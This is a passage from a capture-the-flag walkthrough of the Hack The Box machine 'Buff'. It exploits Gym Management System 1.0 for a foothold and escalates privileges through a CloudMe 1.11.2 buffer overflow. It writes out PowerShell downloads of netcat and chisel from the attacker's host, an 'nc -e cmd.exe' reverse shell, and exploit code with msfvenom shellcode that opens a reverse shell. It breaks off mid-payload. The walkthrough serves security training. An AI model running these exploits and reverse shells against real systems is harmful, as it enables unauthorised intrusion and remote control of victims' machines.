$ mkdir nmap; nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6<span style="color:#f92672">)</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n’s Bro Hut
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Visiting port 8080 displays a website for a Gym, on the title it is called &ldquo;mrb3n&rsquo;s Bro Hut&rdquo;.</p>
<p><img src="imgs/image-20210502140814680.png" alt="image-20210502140814680" style="zoom: 67%;" /></p>
<p>Clicking on the contact page discovers the name of the software behind this web application.</p>
<p><img src="imgs/image-20210502140846741.png" alt="image-20210502140846741" style="zoom:67%;" /></p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the software name to <code>searchsploit</code>. It shows several exploits, and one that stands out is the remote code execution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «machines» «10.10.14.18»
$ searchsploit Gym Management System 1.0
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - <span style="color:#e6db74">&#39;id&#39;</span> SQL Injection                                 | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                              | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                        | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution              | php/webapps/48506.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-shaun">Shell as shaun</h3>
<p><code>searchsploit -m</code> allows me to mirror/make a copy of the &ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution&rdquo; exploit to the current working directory</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ searchsploit -m <span style="color:#ae81ff">48506</span>
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/htb/machines/buff/exploit/48506.py


→ root@kali «exploit» «10.10.14.18»
$ ls -l
total <span style="color:#ae81ff">8</span>
-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">5164</span> May  <span style="color:#ae81ff">2</span> 04:29 48506.py
</code></pre></div><p>I’ll rename <code>48506.py</code> to <code>exploit.py</code>, and run it afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «exploit» «10.10.14.18»
$ python exploit.py http://10.10.10.198:8080/
</code></pre></div><p><img src="imgs/image-20210502153153898.png" alt="image-20210502153153898" style="zoom:67%;" /></p>
<p>With current pseudo shell access, I can&rsquo;t change my directory but I can still grab the user flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; type \users\shaun\desktop\user.txt
</code></pre></div><h4 id="upgrade-to-interactive-shell">Upgrade to Interactive Shell</h4>
<p>To make the shell a bit more comfy, I uploaded a <code>netcat</code> using <code>powershell</code> to Buff, and then I&rsquo;ll create another reverse shell session.</p>
<p>First, I&rsquo;ll host the 64 bit netcat, <code>nc64.exe</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.10.198 - - <span style="color:#f92672">[</span>14/Aug/2020 10:11:02<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span>
</code></pre></div><p>On Buff, I&rsquo;ll grab the hosted <code>nc64.exe</code> using PowerShell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\xampp\htdocs\gym\upload&gt; powershell.exe <span style="color:#e6db74">&#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe&#34;</span>
</code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded <code>nc.exe</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt;.\nc.exe -e cmd.exe 10.10.14.18 9001
</code></pre></div><p>I have a &ldquo;proper&rdquo; shell now</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.18<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.198<span style="color:#f92672">]</span> <span style="color:#ae81ff">64518</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17134.1550<span style="color:#f92672">]</span>  
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.   

C:<span style="color:#ae81ff">\x</span>ampp<span style="color:#ae81ff">\h</span>tdocs<span style="color:#ae81ff">\g</span>ym<span style="color:#ae81ff">\u</span>pload&gt;
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>After enumerating the Users folder, I noticed a slightly different output when typing the <code>dir</code> command in <code>shaun</code> home directory.</p>
<p><div class="img-container"><img src="imgs/image-20210502155544622.png" alt="image-20210502155544622"  /></div>
</p>
<p>In the Download folder, there is an executable file called <code>CloudMe_1112.exe</code> where 1112 is likely a version number.</p>
<p>Checking on currently running services with <code>netstat</code> discovers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\xampp\htdocs\gym\upload&gt; netstat -aonp tcp
Active Connections

  Proto  Local Address          Foreign Address        State           PID

...&lt;SNIP&gt;...
  TCP    127.0.0.1:8888            0.0.0.0:0              LISTENING       7352
...&lt;SNIP&gt;...  
</code></pre></div><p>I can search the program name using the <code>tasklist</code> command.</p>
<pre><code>C:\xampp\htdocs\gym\upload&gt; tasklist /FI “PID eq 7352&quot; /v /FO list
</code></pre><p><img src="imgs/image-20210502160832477.png" alt="image-20210502160832477" style="zoom:67%;" /></p>
<p>So PID 7352 on port 8888 is running <code>CloudMe.exe</code>.</p>
<p>Because the user name field is showing as <strong>N/A</strong>, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).</p>
<h4 id="searchsploit-1">Searchsploit</h4>
<p>A quick search about &ldquo;CloudMe&rdquo; on <code>searchsploit</code> pops several buffer overflow exploits with four of them are exact match.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ searchsploit CloudMe
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow <span style="color:#f92672">(</span>PoC<span style="color:#f92672">)</span>                                         | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow <span style="color:#f92672">(</span>SEH_DEP_ASLR<span style="color:#f92672">)</span>                                | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP <span style="color:#f92672">(</span>DEP_ASLR<span style="color:#f92672">)</span>                                | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow <span style="color:#f92672">(</span>DEP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                               | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow <span style="color:#f92672">(</span>SEH<span style="color:#f92672">)(</span>DEP Bypass<span style="color:#f92672">)</span>                        | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                 | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                    | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 <span style="color:#f92672">(</span>DEP Bypass<span style="color:#f92672">)</span>                       | windows_x86-64/remote/46250.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow                                        | windows/remote/44027.py
CloudMe Sync &lt; 1.11.0 - Buffer Overflow <span style="color:#f92672">(</span>SEH<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>DEP Bypass<span style="color:#f92672">)</span>                     | windows_x86-64/remote/44784.py
------------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h4 id="tunneling">Tunneling</h4>
<p>The CloudMe program is currently listening on localhost (bound), so to interact with it, I&rsquo;ll have to setup a tunnel/port forwarding. For this, I&rsquo;ll use <code>chisel</code> (<a href="https://github.com/jpillora/chisel/releases)">https://github.com/jpillora/chisel/releases)</a>.</p>
<blockquote>
<p>Example usage of chisel are explained better in this blog :</p>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel</a></li>
</ul>
</blockquote>
<p>First, I&rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\shaun\Download&gt; powershell.exe <span style="color:#e6db74">&#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe&#34;</span>
</code></pre></div><p>Second, I&rsquo;ll setup a chisel server on my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ chisel server -p <span style="color:#ae81ff">9002</span>
2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2
2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002...
</code></pre></div><p>On Buff, I&rsquo;ll connect as client to my chisel server on Kali.</p>
<pre><code>C:\Users\shaun\Download&gt; .\cs.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888
</code></pre><p><img src="imgs/image-20210502162654346.png" alt="image-20210502162654346" style="zoom:67%;" /></p>
<p>This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff&rsquo;s localhost on port 8888.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Kali localhost:8888 &lt;-&gt; (Kali 10.10.14.18:9002 &lt;-&gt; Buff:10.10.10.198:XXX) &lt;-&gt; Buff localhost:8888
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>I&rsquo;ll use this exploit PoC (I&rsquo;ve renamed it to <code>bofexploit.py</code>) but I&rsquo;ll have to modify the payload with my own.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)</span>
<span style="color:#75715e"># Date: 2020-04-27</span>
<span style="color:#75715e"># Exploit Author: Andy Bowden</span>
<span style="color:#75715e"># Vendor Homepage: https://www.cloudme.com/en</span>
<span style="color:#75715e"># Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe</span>
<span style="color:#75715e"># Version: CloudMe 1.11.2</span>
<span style="color:#75715e"># Tested on: Windows 10 x86</span>

<span style="color:#75715e">#Instructions:</span>
<span style="color:#75715e"># Start the CloudMe service and run the script.</span>

<span style="color:#f92672">import</span> socket

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>

padding1   <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1052</span>
EIP        <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xB5\x42\xA8\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
NOPS       <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>

<span style="color:#75715e">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python</span>
payload    <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c</span><span style="color:#e6db74">&#34;</span>
payload   <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f</span><span style="color:#e6db74">&#34;</span>

overrun    <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1500</span> <span style="color:#f92672">-</span> len(padding1 <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> payload))

buf <span style="color:#f92672">=</span> padding1 <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> overrun

<span style="color:#66d9ef">try</span>:
        s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
        s<span style="color:#f92672">.</span>connect((target,<span style="color:#ae81ff">8888</span>))
        s<span style="color:#f92672">.</span>send(buf)
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">print</span>(sys<span style="color:#f92672">.</span>exc_value)
</code></pre></div><p>To generate new payload, I&rsquo;ll follow the instruction on the PoC code which is using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before during upgrading the <code>shaun</code> shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «buff» «10.10.14.18»
$ msfvenom -p windows/exec CMD=&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39; -b &#39;\x00\x0A\x0D&#39; -f python -v payload

...&lt;SNIP&gt;...
payload += b&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;
payload += b&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;
payload += b&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;
payload += b&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;
payload += b&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;
payload += b&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;
payload += b&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;
payload += b&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;
payload += b&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;
payload += b&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;
payload += b&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;
payload += b&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;
payload += b&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;
payload += b&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;
payload += b&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;
payload += b&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;
payload += b&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;
payload += b&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;
payload += b&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;
payload += b&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;
payload += b&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;
payload += b&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;
payload += b&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;
</code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket

target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
padding1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1052</span>
EIP <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xB5\x42\xA8\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
NOPS <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>

payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span style="color:#e6db74">&#34;</span>
